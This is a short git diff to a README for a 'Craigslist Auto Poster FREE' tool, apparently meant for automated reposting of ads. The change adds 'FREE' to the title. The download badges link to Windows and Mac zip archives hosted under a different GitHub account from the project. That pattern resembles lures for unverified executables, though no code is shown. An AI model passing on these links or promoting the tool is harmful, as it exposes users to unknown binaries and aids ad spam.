@@ -1,4 +1,4 @@
-# Craigslist Auto Poster
+# Craigslist Auto Poster FREE
 ![Craigslist Auto Poster](https://github.com/craigslist-automated/Craigslist-auto-poster-free/blob/main/images/craigslistrelister.png?raw=true)
 ## Download
 [![Craigslist Auto Poster Windows](https://github.com/craigslist-automated/Craigslist-auto-poster-free/blob/main/images/windows.png?raw=true)](https://github.com/appdownloads/software/raw/main/craigslist-reposter-windows.zip)  |  [![Craigslist Auto Poster Mac](https://github.com/craigslist-automated/Craigslist-auto-poster-free/blob/main/images/mac.png?raw=true)](https://github.com/appdownloads/software/raw/main/craigslist-reposter-mac.zip)
